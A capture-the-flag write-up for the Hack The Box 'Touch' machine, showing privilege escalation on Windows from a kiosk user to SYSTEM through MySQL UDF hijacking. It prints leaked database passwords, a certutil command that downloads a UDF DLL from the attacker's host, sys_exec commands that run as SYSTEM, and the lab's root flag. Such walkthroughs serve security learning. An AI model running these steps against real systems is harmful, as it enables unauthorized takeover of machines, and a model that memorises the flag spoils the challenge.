# HTB "Touch" — Root / Privilege Escalation Writeup

**Target:** `10.129.46.137` (hostname: `KIOSK-042`, Windows 11 / Server 2025 Build 26100)
**Starting point:** `cmd.exe` as `KIOSK-042\KioskUser` (low-priv kiosk user — see the user-flag writeup for how foothold was gained)
**Goal:** SYSTEM / read `C:\Users\Administrator\Desktop\root.txt`
**Root flag:** `1154235ea6ae5158be9b6f8d552b3dee`

Privesc technique: **MySQL UDF (User-Defined Function) hijacking** — abusing a MySQL service running as `LocalSystem` plus a leaked `root` DB password to load a malicious DLL and execute commands as SYSTEM.

---

## 1. Enumeration as KioskUser

### 1.1 Identity, privileges, groups

```cmd
whoami /all
```

Findings:
- User: `KIOSK-042\KioskUser`
- Member of a custom local group: **`KIOSK-042\Printer Administrators`** (a distractor)
- Member of `BUILTIN\Remote Desktop Users` (explains the RDP access)
- **No useful token privileges** — no `SeImpersonate`, `SeBackup`, `SeRestore`, etc. So the usual "potato" / token-abuse routes are out.

The lack of impersonation privileges meant the escalation had to come from a misconfigured service or stored credential, not a token attack.

### 1.2 Service hunting — MySQL running as SYSTEM

Listing services and inspecting the interesting one:

```cmd
sc query state=all | findstr /i "SERVICE_NAME"
sc qc MySQL80
```

Key result:

```
SERVICE_NAME: MYSQL80
  BINARY_PATH_NAME  : C:\MySQL\bin\mysqld.exe --defaults-file=C:\MySQL\my.ini MySQL80
  START_TYPE        : 2  AUTO_START
  SERVICE_START_NAME : LocalSystem      <-- runs as SYSTEM
```

**MySQL 8.0 runs as `LocalSystem`.** Anything we can make the MySQL server execute on disk runs with SYSTEM privileges — this is the whole basis of the UDF attack.

### 1.3 Confirming the MySQL install layout

```cmd
type C:\MySQL\my.ini
```

```ini
[mysqld]
basedir=C:/MySQL
datadir=C:/MySQL/data
port=3306
bind-address=127.0.0.1
default-authentication-plugin=mysql_native_password
```

So MySQL only listens on `127.0.0.1:3306` (local only — must be exploited from on-box).

---

## 2. Finding MySQL Credentials

### 2.1 Low-priv app credentials (insufficient)

The HTB Airways kiosk backend hardcodes a DB account. Found in the app source:

```cmd
findstr /si "password mysql createConnection createPool user root host" "C:\Program Files\HTB Airways\Kiosk\packages\backend\src\*.ts"
```

`...\src\database\index.ts` contained:

```
const defaults = { host: "127.0.0.1", port: 3306, user: "kiosk_app", password: "K!0sk_R3pl1ca#DB", database: "htb_airways" };
```

Testing `kiosk_app`:

```cmd
C:\MySQL\bin\mysql.exe -u kiosk_app -pK!0sk_R3pl1ca#DB -e "select user(), @@version, @@plugin_dir, @@secure_file_priv;"
```

| user() | version | plugin_dir | secure_file_priv |
|--------|---------|------------|------------------|
| kiosk_app@localhost | 8.0.42 | C:\MySQL\lib\plugin\ | NULL |

And the grants:

```cmd
C:\MySQL\bin\mysql.exe -u kiosk_app -pK!0sk_R3pl1ca#DB -e "show grants;"
```

```
GRANT USAGE ON *.* TO `kiosk_app`@`localhost`
GRANT ALL PRIVILEGES ON `htb_airways`.* TO `kiosk_app`@`localhost`
```

**Problem:** `kiosk_app` only has rights on the `htb_airways` database — **no access to the `mysql` database**, so it **cannot `CREATE FUNCTION`** (that requires INSERT on `mysql.func`). Confirmed:

```cmd
C:\MySQL\bin\mysql.exe -u kiosk_app -pK!0sk_R3pl1ca#DB -e "use htb_airways; CREATE FUNCTION sys_exec RETURNS INT SONAME 'x.dll';"
-- ERROR 1044 (42000): Access denied for user 'kiosk_app'@'localhost' to database 'mysql'
```

So we needed a privileged MySQL account (ideally `root`).

### 2.2 Leaked MySQL root password

The DB-sync related files in `C:\ProgramData\HTB Airways\` were mostly ACL-locked to Admin/SYSTEM (`db-config.ini`, `db-sync-replica.ps1` → "Access is denied"), **but a sibling batch file was world-readable**:

```cmd
type "C:\ProgramData\HTB Airways\refresh-dates.bat"
```

```bat
@echo off
C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 < "C:\ProgramData\HTB Airways\refresh-dates.sql" 2>nul
```

**MySQL root password leaked in plaintext:** `root` / `HTB@irw4ys_DB!2026`

Lesson: even when the sensitive config files are locked down, a helper `.bat`/scheduled-task script that calls them often isn't — always read every script in a credentials-adjacent folder.

Confirmed:

```cmd
C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 -e "select current_user();"
-- root@localhost
```

---

## 3. Why MySQL UDF Hijacking Works Here

The conditions for a UDF `sys_exec` attack were all met:

| Requirement | Status |
|-------------|--------|
| MySQL service runs as a high-priv account | ✅ `LocalSystem` |
| We have a MySQL account that can `CREATE FUNCTION` | ✅ `root` (full privileges) |
| We can write a DLL into the plugin directory | ✅ plugin dir `C:\MySQL\lib\plugin\` is writable by `Authenticated Users` (Modify) |

`secure_file_priv = NULL` **blocks** the `SELECT ... INTO DUMPFILE` method of writing the DLL via SQL, so instead the DLL was written to the plugin directory directly using our KioskUser filesystem write access.

Verifying plugin-dir write access:

```cmd
icacls "C:\MySQL\lib\plugin"
-- NT AUTHORITY\Authenticated Users:(I)(OI)(CI)(IO)(M)   <-- Modify = writable

echo test > "C:\MySQL\lib\plugin\test.txt" && echo WRITABLE && del "C:\MySQL\lib\plugin\test.txt"
-- WRITABLE
```

---

## 4. Exploitation — UDF → SYSTEM

### 4.1 Prepare the UDF DLL (on Kali)

`lib_mysqludf_sys_64.dll` ships with Metasploit/Kali:

```bash
locate lib_mysqludf_sys_64.dll
# /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll

cp /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll /home/kali/HTB/Touch/
cd /home/kali/HTB/Touch && python3 -m http.server 8000
```

(Attacker tun0 IP in this run: `10.10.15.76`)

### 4.2 Download the DLL into the plugin directory (on target)

```cmd
certutil -urlcache -f http://10.10.15.76:8000/lib_mysqludf_sys_64.dll C:\MySQL\lib\plugin\udf.dll
-- CertUtil: -URLCache command completed successfully.
```

### 4.3 Register the UDF as MySQL root

> Two gotchas hit during this step:
> - `CREATE FUNCTION` needs a database context → add `-D mysql`.
> - The keyword is **`RETURNS INT`**, not `RETURN INT`.

```cmd
C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 -D mysql -e "CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.dll';"
```

(No error = function registered.)

### 4.4 Execute as SYSTEM and exfil the flag

`sys_exec` runs its argument via the MySQL process, which is SYSTEM. Redirect the Administrator flag to the writable plugin dir so KioskUser can read it back:

```cmd
C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 -D mysql -e "SELECT sys_exec('cmd /c type C:\\Users\\Administrator\\Desktop\\root.txt > C:\\MySQL\\lib\\plugin\\r.txt');"
-- returns 0 (success)
```

### 4.5 Read the root flag

```cmd
type C:\MySQL\lib\plugin\r.txt
```

```
1154235ea6ae5158be9b6f8d552b3dee
```

**Root flag:** `1154235ea6ae5158be9b6f8d552b3dee`

---

## 5. Full Privesc Chain Summary

```
KioskUser cmd.exe (no useful privileges)
  → enum services: MySQL80 runs as LocalSystem
  → app source leaks kiosk_app DB creds (but only htb_airways rights — cannot CREATE FUNCTION)
  → readable helper script C:\ProgramData\HTB Airways\refresh-dates.bat
     leaks MySQL root password: HTB@irw4ys_DB!2026
  → plugin dir C:\MySQL\lib\plugin\ is writable by Authenticated Users
  → download lib_mysqludf_sys_64.dll into plugin dir (certutil)
  → as MySQL root: CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.dll'
  → SELECT sys_exec('cmd /c type ...root.txt > ...r.txt')  [runs as SYSTEM]
  → read r.txt from the writable plugin dir
  → SYSTEM / root flag
```

## 6. Key Takeaways

- **A database service running as SYSTEM is a privesc goldmine.** If you can get an admin DB login + write to the plugin dir, UDF `sys_exec` gives you SYSTEM code execution.
- **Credential files are often locked, but the scripts that *use* them aren't.** The `.ini`/`.ps1` were ACL-protected; the `.bat` that called `mysql.exe` with the root password inline was readable — that single oversight handed over `root`.
- **Check `secure_file_priv` early.** `NULL` kills the `INTO DUMPFILE` DLL-drop, forcing the filesystem-write route instead — but doesn't stop the attack when the plugin dir is writable.
- **Account privilege ≠ server privilege.** `kiosk_app` had `ALL PRIVILEGES` on its own database but still couldn't touch `mysql.func`. Always test whether the DB user can actually `CREATE FUNCTION` before committing to the UDF path.
- **Syntax discipline on the finish:** `RETURNS INT` (not `RETURN`), and `CREATE FUNCTION` needs a selected database (`-D mysql`).

## 7. Cleanup (good practice)

```cmd
C:\MySQL\bin\mysql.exe -u root -pHTB@irw4ys_DB!2026 -D mysql -e "DROP FUNCTION sys_exec;"
del C:\MySQL\lib\plugin\udf.dll
del C:\MySQL\lib\plugin\r.txt
```
